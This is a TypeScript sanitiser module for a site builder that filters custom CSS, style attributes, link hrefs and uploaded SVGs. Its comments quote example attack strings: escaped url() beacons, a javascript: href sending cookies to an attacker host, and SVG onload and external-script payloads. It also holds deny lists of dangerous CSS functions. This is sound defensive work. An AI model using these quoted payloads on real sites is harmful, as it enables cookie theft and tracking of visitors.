import sanitizeHtmlLib from "sanitize-html";
import postcss from "postcss";

// ---------------------------------------------------------------------------
// HTML / CSS sanitisation
// ---------------------------------------------------------------------------

/**
 * CSS escapes, resolved.
 *
 * A browser reads `\\75 rl(…)` as `url(…)` and `@im\\port` as `@import`. A
 * pattern matching the text does not, which is how both of those walked past
 * the version of this that matched text. Every name and value below is
 * decoded before it is judged — and judged, never edited, so what a browser
 * ends up reading is either the author's own bytes or nothing at all.
 */
export function decodeCssEscapes(input: string): string {
  return input.replace(/\\([0-9a-fA-F]{1,6})[ \t\n\f\r]?|\\([\s\S])/g, (_m, hex, ch) => {
    if (!hex) return ch;
    const code = parseInt(hex, 16);
    try {
      return code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : "\ufffd";
    } catch {
      return "\ufffd";
    }
  });
}

/**
 * One CSS escape, whole.
 *
 * `\\75 ` is a single escape meaning `u` — six hex digits at most, and the
 * space that ends it belongs to the escape rather than separating anything.
 * Taking it two characters at a time splits `\\75 rl(` into a stray `5` and an
 * identifier called `rl`, which is how an escaped `url(` walked past the
 * first version of this scanner.
 */
function readEscape(value: string, start: number): { text: string; end: number } {
  const m = /^\\(?:([0-9a-fA-F]{1,6})[ \t\n\f\r]?|[\s\S])/.exec(value.slice(start));
  if (!m) return { text: value[start] ?? "", end: start + 1 };
  return { text: m[0], end: start + m[0].length };
}

/** Walks past a quoted string, respecting backslash escapes inside it. */
function endOfString(value: string, start: number): number {
  const quote = value[start];
  let i = start + 1;
  while (i < value.length) {
    if (value[i] === "\\") { i = readEscape(value, i).end; continue; }
    if (value[i] === quote) return i + 1;
    i++;
  }
  return value.length;
}

/** The argument of a call that opens at `open`, and where it ends. */
function readArgument(value: string, open: number): { arg: string; end: number } {
  let depth = 0;
  let i = open;
  while (i < value.length) {
    const c = value[i];
    if (c === "\\") { i = readEscape(value, i).end; continue; }
    if (c === '"' || c === "'") { i = endOfString(value, i); continue; }
    if (c === "(") { depth++; i++; continue; }
    if (c === ")") {
      depth--;
      if (depth === 0) return { arg: value.slice(open + 1, i), end: i + 1 };
      i++;
      continue;
    }
    i++;
  }
  // Never closed. Treat the rest as the argument, so it is still examined.
  return { arg: value.slice(open + 1), end: value.length };
}

/**
 * How deep a value may nest calls, and how many it may contain in total.
 *
 * `rgb(rgb(rgb(…)))` nested nine thousand times in 45 KB of `customCss` made
 * every page of the site answer 500, because the scanner below used to recurse
 * once per call and re-scan the whole of each argument — quadratic work, and a
 * stack that ran out before it finished. There is no legitimate stylesheet
 * anywhere near these numbers.
 */
const MAX_CALL_DEPTH = 24;
const MAX_CALLS = 2000;

/**
 * How much custom CSS one site may have. Generous — the largest stylesheet the
 * bundled templates produce is under 4 KB — and finite, which is the point.
 */
export const MAX_CSS_BYTES = 256 * 1024;

/** Stands in for a value this scanner refused to finish reading. */
export const UNREADABLE_CALL = "\u0000unreadable";

/**
 * Every function call in a value, by name, with its argument.
 *
 * Quote-aware, which the pattern this replaces was not: it read
 * `url("a)b.png")` as ending at the bracket inside the string and left the
 * rest of the stylesheet mangled behind it.
 *
 * Iterative, which the version before this one was not. Each argument is put
 * on a work list rather than re-scanned inside a recursive call, so the cost
 * is linear in the length of the value; and a value that runs past either
 * limit above yields a call named UNREADABLE_CALL, which nothing treats as
 * safe. Refusing to judge and refusing the value are the same answer here.
 */
export function cssFunctionCalls(value: string): { name: string; arg: string }[] {
  const calls: { name: string; arg: string }[] = [];
  const work: { text: string; depth: number }[] = [{ text: value, depth: 0 }];

  while (work.length > 0) {
    const { text, depth } = work.pop()!;
    if (depth > MAX_CALL_DEPTH || calls.length >= MAX_CALLS) {
      calls.push({ name: UNREADABLE_CALL, arg: "" });
      return calls;
    }

    let ident = "";
    let i = 0;
    while (i < text.length) {
      const c = text[i];
      if (c === "\\") {
        const esc = readEscape(text, i);
        ident += esc.text;
        i = esc.end;
        continue;
      }
      if (c === '"' || c === "'") { i = endOfString(text, i); ident = ""; continue; }
      if (c === "(") {
        const { arg, end } = readArgument(text, i);
        calls.push({ name: decodeCssEscapes(ident).toLowerCase(), arg });
        // A call can hide inside another call's argument.
        work.push({ text: arg, depth: depth + 1 });
        ident = "";
        i = end;
        continue;
      }
      if (/[-\w]/.test(c)) { ident += c; i++; continue; }
      ident = "";
      i++;
    }
  }
  return calls;
}

/** At-rules that cannot fetch anything or re-point the sheet. */
const ALLOWED_AT_RULES = new Set([
  "media", "supports", "container", "layer", "scope", "page",
  "keyframes", "-webkit-keyframes", "-moz-keyframes", "-o-keyframes",
  "font-face", "property", "starting-style", "counter-style", "font-feature-values",
]);

/** Properties whose whole job was to load code, in engines that allowed it. */
const BANNED_PROPERTIES = new Set(["behavior", "-moz-binding", "-ms-behavior"]);

/** Calls that fetch, or that ran script where they were supported. */
const BANNED_FUNCTIONS = new Set([
  "expression", "-ms-expression",
  "image", "image-set", "-webkit-image-set",
  "cross-fade", "-webkit-cross-fade",
  "element", "paint", "src",
]);

function unquote(value: string): string {
  const v = value.trim();
  return /^["'][\s\S]*["']$/.test(v) ? v.slice(1, -1) : v;
}

/**
 * True when a declaration cannot reach off the page or run anything.
 *
 * Exported because the same question is asked of a `style` attribute inside
 * somebody's content, which used to be copied through byte for byte.
 */
export function declarationIsSafe(prop: string, value: string): boolean {
  if (BANNED_PROPERTIES.has(decodeCssEscapes(prop).trim().toLowerCase())) return false;

  for (const call of cssFunctionCalls(value)) {
    // A value the scanner gave up on is a value nobody can vouch for.
    if (call.name === UNREADABLE_CALL) return false;
    if (call.name === "url") {
      // A reference inside the same document — `fill: url(#gradient)`, which
      // the previous version threw away along with the real exfiltration
      // targets. Anything that names somewhere else is dropped.
      if (!unquote(decodeCssEscapes(call.arg)).startsWith("#")) return false;
      continue;
    }
    if (BANNED_FUNCTIONS.has(call.name)) return false;
  }

  // A scheme sitting bare in a value, with no call around it.
  if (/(?:javascript|vbscript|data)\s*:/i.test(decodeCssEscapes(value))) return false;
  return true;
}

/**
 * Properties a `style` attribute inside somebody's content may not set.
 *
 * Separate from the list above, which is about fetching and executing. These
 * are about taking over the page: `position: fixed; inset: 0; z-index: 9999`
 * is a transparent sheet over the whole window — over the published page, and
 * over the builder's own editor when the block is opened there. Clicks land
 * on it instead of on what the reader meant to click. The site's own
 * stylesheet is written by the operator and keeps all of these; a `style`
 * attribute is content, and content does not get to move itself out of the
 * document flow.
 */
const CONTENT_STYLE_BANNED = new Set([
  "position", "z-index", "pointer-events",
  "inset", "top", "right", "bottom", "left",
  "transform", "translate", "rotate", "scale",
  "clip-path", "clip",
  "mix-blend-mode", "isolation",
  "-webkit-user-select", "user-select",
]);

/** Whether a property is one content may set at all. */
function contentStyleAllows(prop: string): boolean {
  const name = decodeCssEscapes(prop).trim().toLowerCase();
  // A custom property can be read back into anything, including a property
  // above, so content does not get to define one either.
  if (name.startsWith("--")) return false;
  return !CONTENT_STYLE_BANNED.has(name);
}

/**
 * A `style` attribute out of somebody's content, filtered.
 *
 * `sanitize-html` parses a `style` attribute only when it is given an
 * `allowedStyles` map; without one it copies the attribute through byte for
 * byte. It was never given one. So `style="background:url(https://attacker/x)"`
 * on any element the sanitiser accepts became a beacon that fires once per
 * visit — on the published page, in the editor, and in the customer's
 * downloaded site — and `position:fixed;inset:0` became an invisible sheet
 * over the whole window. No script runs, which is why this was not critical;
 * tracking and click redirection are enough on their own.
 *
 * Filtering it with a pattern is not an option: `\75 rl(` is `url(` to a
 * browser and not to a regular expression. So it goes through the same postcss
 * parse and the same `declarationIsSafe()` the site's own stylesheet does,
 * wrapped in a dummy rule to give the parser something to hold on to.
 */
export function sanitizeStyleAttribute(value: string): string {
  if (!value || !value.trim()) return "";

  let root: ReturnType<typeof postcss.parse>;
  try {
    root = postcss.parse(`x{${value}}`);
  } catch {
    // Unparseable: keep none of it rather than guess which half was meant.
    return "";
  }

  const kept: string[] = [];
  root.walkDecls((decl) => {
    if (!contentStyleAllows(decl.prop)) return;
    if (!declarationIsSafe(decl.prop, decl.value)) return;
    kept.push(`${decl.prop}:${decl.value}${decl.important ? " !important" : ""}`);
  });

  // A `style` attribute is written into an attribute, not into a <style>
  // element, so there is no closing tag to neutralise — but the value is
  // about to be serialised into markup by sanitize-html, and a quote in it
  // would be escaped there. What cannot be escaped there is a newline in the
  // middle of a declaration, so those go.
  return kept.join(";").replace(/[\r\n]+/g, " ");
}

/**
 * A URL a link or a media reference may point at.
 *
 * Nothing used to check the scheme of a button's `href`. A block whose href is
 * `javascript:fetch('https://attacker/'+document.cookie)` was stored,
 * published, and copied into the download unchanged. On the builder origin the
 * nonce CSP refuses the navigation; the exported site has no CSP at all, so on
 * the customer's own domain the call-to-action button — the element visitors
 * click most — ran the attacker's script.
 *
 * Returns the URL to use, or `undefined` when there is nothing safe to keep.
 * Relative paths and fragments are fine; they cannot name a scheme. Control
 * characters are removed first, because a browser strips them before parsing
 * the scheme and so `java\0script:` is `javascript:` to everything that
 * matters.
 */
export function isSafeHref(value: unknown): string | undefined {
  if (typeof value !== "string") return undefined;

  // Tab, newline and NUL are dropped by URL parsers inside a scheme.
  const cleaned = value.replace(/[\u0000-\u0020\u007f]/g, (c) => (c === " " ? " " : "")).trim();
  if (!cleaned) return undefined;

  // A fragment or a path. Neither can carry a scheme, but `//host` is
  // protocol-relative and does name somewhere else, which is still fine over
  // http(s) — it is only a scheme we are ruling on here.
  if (/^[#/?]/.test(cleaned)) return cleaned;
  if (cleaned.startsWith("./") || cleaned.startsWith("../")) return cleaned;

  const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(cleaned)?.[1]?.toLowerCase();
  // No scheme at all: a bare relative reference such as `about.html`.
  if (!scheme) return cleaned;

  return ["http", "https", "mailto", "tel"].includes(scheme) ? cleaned : undefined;
}

/**
 * The site's own CSS, with anything that reaches off the page taken out.
 *
 * Parsed rather than pattern-matched. The version this replaces ran a list of
 * regular expressions over the raw text, and every one of these got past it:
 *
 *   \\75 rl('https://evil/?x')          a browser reads that as url()
 *   url("a)b.png")                     the bracket inside the string ended
 *                                      the match, mangling the rest
 *   @im\\port url('…')                  the same trick on an at-rule
 *
 * and, worst of the three, it left `</style>` alone. This CSS is written into
 * a <style> element, and the HTML parser ends that element at the first
 * `</style` it meets whatever it means in CSS — so a stylesheet could close
 * its own tag and open a <script>. That was live on every published page.
 */
export function sanitizeCss(css: string): string {
  if (css.length > MAX_CSS_BYTES) {
    return "/* This CSS is larger than Neuravex will read, so none of it was used. */";
  }

  let root: ReturnType<typeof postcss.parse>;
  try {
    root = postcss.parse(css);
  } catch {
    // Unparseable: keep none of it rather than guess which half was meant.
    return "/* This CSS could not be read, so none of it was used. */";
  }

  try {
    root.walkAtRules((rule) => {
      if (!ALLOWED_AT_RULES.has(decodeCssEscapes(rule.name).toLowerCase())) rule.remove();
    });
    root.walkDecls((decl) => {
      if (!declarationIsSafe(decl.prop, decl.value)) decl.remove();
    });
    return neutralizeStyleEnd(root.toString());
  } catch {
    // The walk itself was only ever guarded around the parse. A stylesheet
    // that makes it throw takes every page of that site to 500 otherwise, and
    // the owner cannot open the editor to remove it.
    return "/* This CSS could not be read, so none of it was used. */";
  }
}

/**
 * Stop a stylesheet closing the element it is written into.
 *
 * The HTML parser looks for `</style` and stops there; it does not care that
 * the text is inside a CSS string or a comment. Backslash-escaping the slash
 * means the same thing in CSS and nothing at all to the HTML parser.
 *
 * postcss escapes the `<` itself when it writes a sheet back out, so on the
 * path above this is the second of two. It is kept because it is the one this
 * file promises: it holds for a string that never went through the parser,
 * and it does not quietly stop working if postcss changes its mind.
 */
export function neutralizeStyleEnd(css: string): string {
  return css.replace(/<\/(?=style)/gi, "<\\/");
}

// ---------------------------------------------------------------------------
// File Upload Validation
// ---------------------------------------------------------------------------

const ALLOWED_EXTENSIONS = new Set([
  "jpg",
  "jpeg",
  "png",
  "gif",
  "webp",
  "avif",
  "svg",
  "ico",
  "mp4",
  "webm",
  "ogg",
  "mp3",
  "wav",
  "pdf",
  "woff",
  "woff2",
  "ttf",
  "otf",
]);

// SVG can contain scripts — strip them if accepted
const DANGEROUS_EXTENSIONS = new Set(["svg"]);

const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB

export function validateUploadFile(
  filename: string,
  size: number
): { valid: true; ext: string } | { valid: false; error: string } {
  if (size > MAX_FILE_SIZE) {
    return { valid: false, error: `File too large. Max ${MAX_FILE_SIZE / 1024 / 1024}MB.` };
  }

  const ext = filename.split(".").pop()?.toLowerCase() ?? "";
  if (!ext || !ALLOWED_EXTENSIONS.has(ext)) {
    return {
      valid: false,
      error: `File type .${ext} is not allowed. Allowed: ${Array.from(ALLOWED_EXTENSIONS).join(", ")}`,
    };
  }

  return { valid: true, ext };
}

export function isDangerousExtension(ext: string): boolean {
  return DANGEROUS_EXTENSIONS.has(ext.toLowerCase());
}

/**
 * SVG elements that draw something.
 *
 * An allowlist, because the danger in SVG is not one tag: <script> runs
 * JavaScript, <foreignObject> embeds HTML, <style> brings CSS, <use> pulls in
 * an external document, and the SMIL elements (<animate>, <set>) can point an
 * attribute at a javascript: URL after the file has loaded. None of them are
 * needed to draw a picture, so none of them are here.
 */
const SVG_TAGS = [
  // No `a`: a picture somebody uploaded has no business being a link, and a
  // link is the only thing in a sanitised SVG that a reader can still click.
  "svg", "g", "defs", "symbol", "title", "desc", "metadata",
  "path", "rect", "circle", "ellipse", "line", "polyline", "polygon",
  "text", "tspan", "textPath", "image",
  "linearGradient", "radialGradient", "stop", "pattern",
  "clipPath", "mask", "marker", "switch",
  "filter", "feBlend", "feColorMatrix", "feComponentTransfer", "feComposite",
  "feConvolveMatrix", "feDiffuseLighting", "feDisplacementMap", "feDropShadow",
  "feFlood", "feFuncA", "feFuncB", "feFuncG", "feFuncR", "feGaussianBlur",
  "feImage", "feMerge", "feMergeNode", "feMorphology", "feOffset",
  "feSpecularLighting", "feTile", "feTurbulence",
];

/** Attributes that carry a URL, and so have to be looked at. */
const URL_ATTRS = /^(?:href|src)$/i;

/** Namespace prefixes an uploaded picture has any business declaring. */
const KNOWN_PREFIXES = new Set(["xml", "xlink", "xmlns"]);

/**
 * An attribute name split into its prefix and its local name.
 *
 * SVG is XML, and in XML a prefix is just a local alias for a namespace. A
 * file can open with `<svg xmlns:x="http://www.w3.org/1999/xlink">` and then
 * write `x:href`, which is the same attribute to a browser as `xlink:href` —
 * but the old list matched attribute names literally, so `x:href` was not on
 * it, the value was stored verbatim, and clicking the picture on the
 * customer's site ran whatever was in it. `<image x:href="https://…">` came
 * through the same gap as a beacon.
 */
function splitAttribute(name: string): { prefix: string; local: string } {
  const colon = name.lastIndexOf(":");
  if (colon === -1) return { prefix: "", local: name };
  return { prefix: name.slice(0, colon).toLowerCase(), local: name.slice(colon + 1) };
}

/**
 * A `style` attribute, with the parts that reach off the file taken out.
 *
 * CSS in an attribute cannot run script in any browser still shipping, but it
 * can still fetch: `background-image: url(https://…)` turns opening a picture
 * into a call to whoever made it. A reference inside the same file — which is
 * how a gradient or a clip path is named — is left alone.
 *
 * This used to be three regular expressions, and both of these went past
 * them: `fill:\75 rl(https://…)`, because a browser resolves the escape and a
 * pattern does not, and `background:image-set(…)`, because `image-set` is not
 * spelled `url`. It is now the same parse the rest of this file uses.
 */
function sanitizeSvgStyle(value: string): string {
  return sanitizeStyleAttribute(value);
}

/** A URL an uploaded picture may point at. Anything else is dropped. */
function safeSvgUrl(value: string): boolean {
  const v = value.trim();
  // A reference inside the same file, or a path — neither can name a scheme.
  if (v.startsWith("#") || v.startsWith("/") || v.startsWith("./") || v.startsWith("../")) return true;
  const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(v)?.[1]?.toLowerCase();
  if (!scheme) return true;
  if (scheme === "http" || scheme === "https") return true;
  // A picture inlined in the file, but not a document: data:text/html carries
  // markup, and markup carries script.
  return scheme === "data" && /^data:image\/(?:png|jpeg|gif|webp);/i.test(v);
}

/**
 * Strip the ways an uploaded SVG can run code.
 *
 * This used to be a list of regular expressions over the raw text, and text is
 * the one thing an attacker controls the shape of. Every one of these went
 * through it untouched:
 *
 *   <svg onload=alert(1)>                  — the pattern wanted quotes
 *   <svg onload\n=\nalert(1)>              — and no newlines
 *   <svg><script src="https://evil/x.js">  — and a closing tag to match
 *
 * Uploads are served from this origin, so that was stored XSS in the builder's
 * own window. A parser does not have that class of hole: it reads the markup
 * the way a browser does, decodes the entities, and hands back tags and
 * attributes that have already been resolved — so there is nothing left to
 * hide a handler inside.
 */
export function sanitizeSvg(content: string): string {
  return sanitizeHtmlLib(content, {
    allowedTags: SVG_TAGS,
    // Every attribute is kept except the ones ruled out below. An allowlist
    // here would have to name every presentation attribute SVG has, and the
    // one it forgot would quietly break somebody's picture.
    allowedAttributes: false,
    disallowedTagsMode: "discard",
    // SVG is case-sensitive: `viewBox` lower-cased is not `viewBox` any more,
    // and the picture loses its scaling when the file is read as XML.
    parser: { lowerCaseTags: false, lowerCaseAttributeNames: false },
    transformTags: {
      "*": (tagName: string, attribs: Record<string, string>) => {
        const kept: Record<string, string> = {};
        for (const [name, value] of Object.entries(attribs)) {
          // Event handlers, whatever they are called and however they were
          // written in the file.
          if (/^on/i.test(name)) continue;

          const { prefix, local } = splitAttribute(name);
          // A prefix nobody needs is a prefix somebody aliased to xlink so
          // that the name would not be recognised.
          if (prefix && !KNOWN_PREFIXES.has(prefix)) continue;
          if (URL_ATTRS.test(local) && !safeSvgUrl(value)) continue;

          kept[name] = local.toLowerCase() === "style" ? sanitizeSvgStyle(value) : value;
        }
        return { tagName, attribs: kept };
      },
    },
  });
}

/** True once a sanitized upload still has a picture in it. */
export function isRenderableSvg(content: string): boolean {
  return /<svg[\s>]/i.test(content);
}
